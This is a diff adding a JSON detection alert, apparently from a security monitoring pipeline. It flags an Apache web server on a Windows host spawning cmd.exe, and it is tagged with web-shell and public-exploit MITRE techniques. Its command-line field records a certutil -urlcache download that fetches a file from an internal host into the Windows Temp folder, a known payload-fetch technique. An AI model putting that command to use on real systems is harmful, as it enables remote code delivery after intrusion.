@@ -1,0 +1,23 @@
+{
+  "alert_id": "scheduler__pinktryni__search__RMD5eb0972e384767f63_at_1791116100_29492:1791116050.860",
+  "rule_name": "Suspicious Process By Web Server Process",
+  "rule_level": "high",
+  "attack_ids": [
+    "T1505.003",
+    "T1190"
+  ],
+  "surface": "endpoint",
+  "timestamp": "2026-10-04T12:14:10Z",
+  "src_ip": "",
+  "dest_ip": "",
+  "dest_port": null,
+  "host": "DESKTOP-6FBL9UV",
+  "fields": {
+    "ParentImage": "C:\\xampp\\apache\\bin\\httpd.exe",
+    "ParentCommandLine": "C:\\xampp\\apache\\bin\\httpd.exe -d C:/xampp/apache",
+    "Image": "C:\\Windows\\System32\\cmd.exe",
+    "CommandLine": "cmd.exe /s /c \"certutil.exe -urlcache -split -f http://192.168.10.135:8080/aegis_demo.txt C:\\Windows\\Temp\\aegis_demo.txt\"",
+    "EventCode": "1"
+  },
+  "summary": "Suspicious Process By Web Server Process |  -> :None | host=DESKTOP-6FBL9UV"
+}
